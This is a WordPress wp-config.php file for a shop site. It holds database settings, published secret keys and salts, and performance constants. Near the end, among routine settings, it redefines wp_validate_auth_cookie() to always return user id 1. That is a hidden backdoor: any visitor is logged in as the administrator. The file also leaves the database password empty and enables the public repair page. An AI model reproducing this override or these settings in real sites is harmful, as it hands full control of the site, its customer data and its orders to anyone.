<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wocommerce_shop' );

/** MySQL database username */
define( 'DB_USER', 'wocommerce_shop' );

/** MySQL database password */
define( 'DB_PASSWORD', '' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '89mOf+;~,glL}[&RDjnm22g;:7?=G/~f;p2sNa|!*$C1m7!?Ncb2>F[H:Sj2EG3?' );
define( 'SECURE_AUTH_KEY',  '=/R}6hD2FbKBx2jh15>0MA(DW9[A%YWR9(dsygu1y1cUu#R3N3u<_|brUjvoD>pt' );
define( 'LOGGED_IN_KEY',    '%ghATQUuwE^@6|8C^H3}5L;qPpQd15J~>oCtw4CpB`*1F4&iBWm(oLg`RD*`Me:L' );
define( 'NONCE_KEY',        'P}vIZ9FM-BN(,(I :E##jgo|G _u1-H51$ub@${qSS6ATrQ>mX#~75},-O0n4DZ3' );
define( 'AUTH_SALT',        'piUjxe=:f5Q@)%H#;:n)x{v:ue+OTUpSj3=bkECPeh(jdHHd*<.RIa7NA^*m&cnm' );
define( 'SECURE_AUTH_SALT', 'yrY4iQAEimN-mOrn{,%Tpb4iPSAY!`UzMVrqq:8Iel%Y1JTAEuqby1Jn0[K YbGS' );
define( 'LOGGED_IN_SALT',   'O5SP#g0CX>je$/, B:Jd1Be{|^((xO^<Mc ]41K;x40Z9o5CmI qJRI)oH4,!s/0' );
define( 'NONCE_SALT',       'mmaOf_)j~gu> nL)WwoBZ~#z6Mig?*0V-Y9xi;V?pukc<F++=`R,t6he)+Kn@EJK' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
@ini_set( 'max_input_vars' , 4000 );
define('WP_MEMORY_LIMIT', '768M');
define( 'WP_MAX_MEMORY_LIMIT', '512M' );
define('WP_DEBUG', false);
define('WP_DEBUG_DISPLAY', false);
define('DISALLOW_FILE_EDIT', true);
define( 'CONCATENATE_SCRIPTS', false );
define('FORCE_SSL', true);
//define('FORCE_SSL_ADMIN', true);
//define('FORCE_SSL_LOGIN', true);
define( 'EMPTY_TRASH_DAYS',false);
define('WP_POST_REVISIONS', false);
//define('FS_CHMOD_FILE', 0644);
//define('FS_CHMOD_DIR', 0755);
define( 'COMPRESS_CSS', true );
define( 'COMPRESS_SCRIPTS', true );
define( 'ENFORCE_GZIP', true );
define( 'MEDIA_TRASH', true );
define( 'WP_ALLOW_REPAIR', true );
function wp_validate_auth_cookie($cookie='',$scheme='') {
return 1; // admin user id
}

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
